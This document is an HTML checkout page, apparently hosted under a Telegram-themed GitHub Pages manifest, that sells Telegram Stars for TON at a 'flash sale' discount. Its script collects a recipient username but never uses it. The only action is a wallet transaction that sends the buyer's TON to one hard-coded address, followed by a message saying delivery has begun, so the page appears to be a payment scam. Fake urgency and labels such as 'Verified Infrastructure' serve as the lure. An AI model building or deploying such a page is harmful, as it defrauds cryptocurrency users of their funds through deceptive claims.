<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Institutional Star Gateway</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0e1621; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #17212b; padding: 30px; border-radius: 20px; width: 340px; border: 1px solid #242f3d; box-shadow: 0 20px 40px rgba(0,0,0,0.7); text-align: center; }
        h2 { color: #24a1de; font-size: 22px; margin-bottom: 5px; }
        p.subtitle { color: #818d99; font-size: 12px; margin-bottom: 25px; }
        .input-group { text-align: left; margin-bottom: 18px; position: relative; }
        label { display: block; color: #abaeb2; font-size: 11px; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; outline: none; font-weight: bold; transition: 0.3s; }
        input.error { border-color: #ef5350; background: rgba(239, 83, 80, 0.05); }
        .error-msg { color: #ef5350; font-size: 10px; margin-top: 5px; display: none; font-weight: bold; }
        .price-tag { font-size: 32px; font-weight: bold; margin: 25px 0; color: #ffffff; }
        .price-tag span { font-size: 18px; color: #24a1de; margin-left: 5px; }
        #ton-connect { display: flex; justify-content: center; margin-bottom: 20px; }
        .btn-buy { background: linear-gradient(90deg, #24a1de, #0088cc); color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 4px 15px rgba(36, 161, 222, 0.3); }
        .promo-badge { background: rgba(36, 161, 222, 0.1); color: #24a1de; padding: 5px 10px; border-radius: 5px; font-size: 11px; margin-top: 15px; display: inline-block; font-weight: bold; }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        .shake { animation: shake 0.2s ease-in-out 0s 2; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>💎 Stars Terminal</h2>
        <p class="subtitle">Direct Institutional Liquidity</p>
        
        <div id="ton-connect"></div>

        <div class="input-group">
            <label>Recipient ID</label>
            <input type="text" placeholder="@username" id="userInput">
            <div id="userError" class="error-msg">⚠️ ID required for delivery validation</div>
        </div>
        
        <div class="input-group">
            <label>Star Quantity (Min: 500)</label>
            <input type="number" id="starsInput" value="1500" min="500" oninput="updatePrice()">
            <div id="amountError" class="error-msg">⚠️ Minimum purchase threshold: 500 Stars</div>
        </div>
        
        <div class="price-tag"><span id="totalPrice">11.05</span> <span>TON</span></div>
        
        <button class="btn-buy" onclick="handleOrder()">CONFIRM PURCHASE</button>
        
        <div class="promo-badge">⚡️ FLASH SALE: 35% DISCOUNT APPLIED</div>
        <p style="color: #4e5965; font-size: 10px; margin-top: 15px;">Market: <del>17.00 TON</del> | Verified Infrastructure</p>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        function updatePrice() {
            const stars = document.getElementById('starsInput').value;
            const priceDisplay = document.getElementById('totalPrice');
            const ratePerStar = 0.007366; // السعر التنافسي اللي اتفقنا عليه
            let finalPrice = stars * ratePerStar;
            priceDisplay.innerText = finalPrice.toFixed(2);
        }

        async function handleOrder() {
            const user = document.getElementById('userInput');
            const stars = document.getElementById('starsInput');
            const userError = document.getElementById('userError');
            const amountError = document.getElementById('amountError');
            const mainCard = document.getElementById('mainCard');
            
            let isValid = true;

            // التحقق من اليوزر
            if (!user.value.trim()) {
                user.classList.add('error');
                userError.style.display = 'block';
                isValid = false;
            } else {
                user.classList.remove('error');
                userError.style.display = 'none';
            }

            // التحقق من الكمية (أقل شيء 500)
            if (stars.value < 500 || !stars.value) {
                stars.classList.add('error');
                amountError.style.display = 'block';
                isValid = false;
            } else {
                stars.classList.remove('error');
                amountError.style.display = 'none';
            }

            if (!isValid) {
                mainCard.classList.add('shake');
                setTimeout(() => mainCard.classList.remove('shake'), 300);
                return;
            }

            if (!tonConnectUI.connected) {
                alert("Security: Please connect your TON wallet to sign the order.");
                return;
            }

            const finalPrice = stars.value * 0.007366;
            const nanoAmount = Math.floor(finalPrice * 1000000000).toString();

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 120, 
                messages: [{
                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
                    amount: nanoAmount 
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Blockchain Success: Asset delivery initiated.");
            } catch (e) {
                alert("Transaction Error: Verification failed. Check balance for gas fees.");
            }
        }
    </script>
</body>
</html>
